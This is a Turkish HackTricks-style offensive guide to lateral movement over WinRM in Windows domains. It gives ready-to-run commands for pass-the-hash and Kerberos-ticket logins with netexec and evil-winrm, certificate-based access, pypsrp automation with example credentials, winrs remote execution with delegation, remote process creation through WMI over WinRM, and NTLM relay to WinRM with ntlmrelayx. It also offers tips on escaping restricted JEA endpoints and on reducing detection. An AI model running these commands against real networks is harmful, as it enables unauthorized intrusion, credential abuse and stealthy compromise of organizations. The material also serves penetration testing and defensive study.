# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM, Windows ortamlarında en kullanışlı **lateral movement** taşıma yöntemlerinden biridir; SMB service oluşturma hilelerine gerek kalmadan **WS-Man/HTTP(S)** üzerinden uzak bir shell sağlar. Hedefte **5985/5986** açıksa ve principal'ınız remoting kullanma iznine sahipse, çoğu zaman “geçerli kimlik bilgileri”nden “etkileşimli shell”e çok hızlı geçebilirsiniz.

**Protokol/service enumeration**, listener'lar, WinRM'i etkinleştirme, `Invoke-Command` ve genel istemci kullanımı için şuraya bakın:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operatörler WinRM'i neden tercih ediyor?

- SMB/RPC yerine **HTTP/HTTPS** kullanır; bu nedenle PsExec tarzı execution'ın engellendiği yerlerde çoğu zaman çalışır.
- **Kerberos** ile hedefe yeniden kullanılabilir kimlik bilgileri gönderilmesini önler.
- **Windows**, **Linux** ve **Python** araçlarıyla (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) sorunsuz çalışır.
- Etkileşimli PowerShell remoting yolu, hedefte kimliği doğrulanmış kullanıcının bağlamında **`wsmprovhost.exe`** başlatır; bu, service tabanlı exec'ten operasyonel olarak farklıdır.

## Erişim modeli ve ön koşullar

Uygulamada, WinRM lateral movement başarısı **üç** şeye bağlıdır:

1. Hedefte bir **WinRM listener** (`5985`/`5986`) ve erişime izin veren firewall kuralları bulunmalıdır.
2. Hesap, endpoint'te **kimlik doğrulayabilmelidir**.
3. Hesabın **remoting session açma izni** olmalıdır.

Bu erişimi sağlamanın yaygın yolları:

- Hedefte **Local Administrator** olmak.
- Yeni sistemlerde **Remote Management Users**, bu gruba hâlâ izin veren sistemlerde/bileşenlerde ise **WinRMRemoteWMIUsers__** üyesi olmak.
- Local security descriptor'lar / PowerShell remoting ACL değişiklikleriyle açıkça devredilmiş remoting hakları.

Admin haklarıyla bir makineyi zaten kontrol ediyorsanız, burada açıklanan tekniklerle tam admin grubu üyeliği olmadan da **WinRM erişimi devredebileceğinizi** unutmayın:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement sırasında önem taşıyan kimlik doğrulama tuzakları

- **Kerberos için hostname/FQDN gerekir**. IP üzerinden bağlanırsanız istemci genellikle **NTLM/Negotiate**'e geri döner.
- **Workgroup** veya trust'ların kesiştiği uç durumlarda NTLM genellikle **HTTPS** kullanılmasını veya hedefin istemcide **TrustedHosts** listesine eklenmesini gerektirir.
- Workgroup'te Negotiate üzerinden **local account** kullanıldığında, yerleşik Administrator hesabı kullanılmadıkça veya `LocalAccountTokenFilterPolicy=1` ayarlanmadıkça UAC uzaktan erişim kısıtlamaları erişimi engelleyebilir.
- PowerShell remoting varsayılan olarak **`HTTP/<host>` SPN**'ini kullanır. **`HTTP/<host>`** başka bir service account'a zaten kaydedilmiş ortamlarda WinRM Kerberos `0x80090322` hatasıyla başarısız olabilir; port içeren bir SPN kullanın veya bu SPN'in mevcut olduğu durumlarda **`WSMAN/<host>`**'e geçin.<sup>[[3]](#references)</sup>

Password spraying sırasında geçerli kimlik bilgileri elde ederseniz, bunların shell'e erişim sağlayıp sağlamadığını kontrol etmenin en hızlı yolu çoğu zaman WinRM üzerinden doğrulamaktır:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux'tan Windows'a lateral movement

### Doğrulama ve tek seferlik execution için NetExec / CrackMapExec

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM ile etkileşimli shell'ler

`evil-winrm`, **parolaları**, **NT hash'lerini**, **Kerberos ticket'larını**, **client certificate'larını**, dosya aktarımını ve bellekte PowerShell/.NET yüklemeyi desteklediğinden Linux'tan en kullanışlı etkileşimli seçenektir.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN uç durumu: `HTTP` vs `WSMAN`

Varsayılan **`HTTP/<host>`** SPN Kerberos hatalarına yol açtığında, bunun yerine **`WSMAN/<host>`** bileti istemeyi/kullanmayı deneyin. Bu durum, **`HTTP/<host>`** SPN'sinin zaten başka bir hizmet hesabına atanmış olduğu sıkılaştırılmış veya alışılmadık kurumsal ortamlarda görülür.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Bu, genel bir `HTTP` ticket'ı yerine özellikle **WSMAN** service ticket'ı oluşturduğunuz veya istediğiniz **RBCD / S4U** abuse sonrasında da kullanışlıdır.

### Sertifika tabanlı kimlik doğrulama

WinRM, **client certificate authentication** yöntemini de destekler; ancak sertifikanın hedefte bir **local account** ile eşlenmiş olması gerekir. Offensive açıdan bu şu durumlarda önemlidir:

- WinRM için önceden eşlenmiş geçerli bir client certificate ve private key'i çaldıysanız/dışa aktardıysanız;
- Bir principal için sertifika elde etmek ve ardından başka bir authentication path'e geçmek üzere **AD CS / Pass-the-Certificate** abuse ettiyseniz;
- Parola tabanlı remoting yöntemlerinden özellikle kaçınan ortamlarda çalışıyorsanız.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM, parola/hash/Kerberos kimlik doğrulamasına kıyasla çok daha az yaygındır; ancak mevcut olduğunda, parola değişiminden sonra da çalışmaya devam eden **passwordless lateral movement** yolu sunabilir.

### Python / `pypsrp` ile otomasyon

Operatör shell'i yerine otomasyona ihtiyacınız varsa, `pypsrp` Python'dan NTLM, certificate auth, Kerberos ve CredSSP desteğiyle WinRM/PSRP kullanmanızı sağlar.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Yüksek seviyeli `Client` sarmalayıcısından daha ayrıntılı denetime ihtiyacınız varsa, düşük seviyeli `WSMan` + `RunspacePool` API’leri operatörlerin sık karşılaştığı iki sorun için kullanışlıdır:

- birçok PowerShell istemcisinin varsayılan `HTTP` beklentisi yerine, Kerberos hizmeti/SPN olarak **`WSMAN`** kullanmaya zorlamak;
- **`Microsoft.PowerShell`** yerine **JEA** / özel oturum yapılandırması gibi **varsayılan olmayan bir PSRP endpoint**’ine bağlanmak.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Lateral movement sırasında özel PSRP uç noktaları ve JEA önemlidir

Başarılı bir WinRM kimlik doğrulaması, **her zaman** varsayılan ve kısıtlamasız `Microsoft.PowerShell` uç noktasına erişeceğiniz anlamına gelmez. Olgun ortamlarda kendi ACL’lerine ve run-as davranışlarına sahip **özel oturum yapılandırmaları** veya **JEA** uç noktaları bulunabilir.<sup>[[1]](#references)</sup>

Bir Windows ana bilgisayarında zaten code execution elde ettiyseniz ve hangi remoting yüzeylerinin mevcut olduğunu anlamak istiyorsanız, kayıtlı uç noktaları listeleyin:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Kullanışlı bir endpoint varsa, varsayılan shell yerine onu açıkça hedefleyin:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Pratik offensive etkileri:

- **Kısıtlı** bir endpoint, hizmet denetimi, dosya erişimi, süreç oluşturma veya keyfi .NET / harici komut yürütme için doğru cmdlet’leri/fonksiyonları sunuyorsa lateral movement için yine de yeterli olabilir.
- **Yanlış yapılandırılmış bir JEA** rolü, `Start-Process` gibi tehlikeli komutları, geniş joker karakterleri, yazılabilir provider’ları veya amaçlanan kısıtlamalardan kaçmanıza olanak tanıyan özel proxy fonksiyonlarını sunuyorsa özellikle değerlidir.
- **RunAs sanal hesapları** veya **gMSA’lerle** desteklenen endpoint’ler, çalıştırdığınız komutların etkin güvenlik bağlamını değiştirir. Özellikle gMSA destekli bir endpoint, normal bir WinRM oturumunun klasik delegation sorunuyla karşılaşacağı durumlarda bile **ikinci hop üzerinde ağ kimliği** sağlayabilir.

Özel bir kısıtlı endpoint için etkin komut ve script izinlerini ayrı ayrı inceleyin: Kısa bir `Get-Command` listesi, mevcut bir `.ps1` dosyasının çalıştırılamayacağını tek başına kanıtlamaz. [JEA rol yetenekleri](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities), hangi script yollarının çağrılabileceğini açıkça denetler; diğer özel endpoint’ler farklı oturum kuralları uygulayabilir. İzin verilen bir script başka bir host için credential oluştururken depolanmış bir `SecureString` kullanıyorsa, açık bir key olmadan oluşturulan blob [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kullanır ve şifresini çözmek için genellikle korumayı sağlayan kullanıcı ve makine bağlamı gerekir. Yazılabilir kaynak kodu veya kopyalanmış bir blob’u host’lar arası bir yetki yükseltme yolu olarak değerlendirmeden önce script’in ACL’sini, izin verilen çağrılma biçimini, run-as kimliğini ve sonraki aşamalardaki credential haklarını inceleyin. Pasif enumeration sırasında korunan değeri yazdırmayın.

Dosya yolu kabul eden özel bir JEA fonksiyonu için kayıtlı endpoint ACL’sini, eşlenen rol yeteneğini ve etkin run-as kimliğini birlikte inceleyin. Çağıran taraf `NoLanguage` modundayken fonksiyon gövdesi sistemin varsayılan dil modunda çalışabilir; sanal hesap ayrıca yerel yönetici haklarına da sahip olabilir. Fonksiyon izin verilen bir dizini ham string prefix ile denetliyor ve ardından sağlanan yolu okuyorsa `..` bileşenleri bu dizinin dışına çözümlenebilir. Sınır; çağıranın dil modu veya görünürdeki prefix değil, fonksiyonun kimliği altında çözümlenen yoldur. Okunabilir bir `.psrc` veya `.pssc` dosyasını ayrıcalıklı dosya okuma bulgusu olarak değerlendirmeden önce erişilebilir fonksiyonu ve son yol doğrulamasını teyit edin. Microsoft’un [JEA rol yeteneği](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) ve [güvenlik konuları](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations) kılavuzlarına bakın.

## Windows yerel WinRM lateral movement

### `winrs.exe`

`winrs.exe` yerleşik olarak gelir ve etkileşimli bir PowerShell remoting oturumu açmadan **yerel WinRM komut yürütme** istediğinizde kullanışlıdır:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

İki flag'i unutmak kolaydır ve pratikte önem taşır:

- Uzak principal yerel yönetici **değilse**, genellikle `/noprofile` gerekir.
- `/allowdelegate`, uzak shell'in kimlik bilgilerinizi **üçüncü bir host** üzerinde kullanmasını sağlar (örneğin, komut `\\fileserver\share` gerektirdiğinde).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Operasyonel açıdan, `winrs.exe` genellikle aşağıdakine benzer bir uzak işlem zinciriyle sonuçlanır:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Bunu hatırlamakta fayda var; çünkü service-based exec yönteminden ve etkileşimli PSRP oturumlarından farklıdır.

### `winrm.cmd` / PowerShell remoting yerine WS-Man COM

`Enter-PSSession` kullanmadan, WS-Man üzerinden WMI sınıflarını çağırarak **WinRM transport** üzerinden de komut yürütebilirsiniz. Böylece taşıma katmanı WinRM olarak kalırken uzaktan yürütme mekanizması **WMI `Win32_Process.Create`** olur:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Bu yaklaşım şu durumlarda kullanışlıdır:

- PowerShell logging yoğun şekilde izleniyorsa.
- Klasik bir PS remoting iş akışı olmadan **WinRM transport** kullanmak istiyorsanız.
- **`WSMan.Automation`** COM object etrafında özel araçlar geliştiriyor veya kullanıyorsanız.

## WinRM'e NTLM relay (WS-Man)

SMB relay signing nedeniyle engellendiğinde ve LDAP relay kısıtlandığında, **WS-Man/WinRM** hâlâ cazip bir relay hedefi olabilir. Modern `ntlmrelayx.py`, **WinRM relay servers** içerir ve **`wsman://`** veya **`winrms://`** hedeflerine relay yapabilir.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

İki pratik not:

- Relay, hedef **NTLM** kabul ettiğinde ve relayed principal'ın WinRM kullanmasına izin verildiğinde en kullanışlıdır.
- Güncel Impacket kodu, **`WSMANIDENTIFY: unauthenticated`** isteklerini özellikle ele alır; böylece `Test-WSMan` tarzı probe'lar relay akışını bozmaz.

İlk WinRM oturumunu aldıktan sonraki çoklu hop kısıtları için bkz.:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC ve tespit notları

- **Interactive PowerShell remoting** genellikle hedefte **`wsmprovhost.exe`** oluşturur.
- **`winrs.exe`** genellikle **`winrshost.exe`** oluşturur ve ardından istenen child process'i başlatır.
- Özel **JEA** endpoint'leri, eylemleri **`WinRM_VA_*`** virtual account'ları veya yapılandırılmış bir **gMSA** olarak çalıştırabilir; bu da normal bir user-context shell'e kıyasla hem telemetry'yi hem de second-hop davranışını değiştirir.<sup>[[1]](#references)</sup>
- Raw `cmd.exe` yerine PSRP kullanıyorsanız **network logon** telemetry'si, WinRM service event'leri ve PowerShell operational/script-block logging bekleyin.
- Yalnızca tek bir komuta ihtiyacınız varsa `winrs.exe` veya tek seferlik WinRM execution, uzun süre çalışan bir interactive remoting session'dan daha az gürültülü olabilir.
- Kerberos kullanılabiliyorsa hem trust sorunlarını hem de istemci tarafında `TrustedHosts` için gereken zahmetli değişiklikleri azaltmak amacıyla IP + NTLM yerine **FQDN + Kerberos** tercih edin.

## References

- [1] [Microsoft: JEA Güvenlik Hususları](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: PowerShell'i WinRM üzerinden uzak bir sunucuya bağlarken `0x80090322` hatası](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
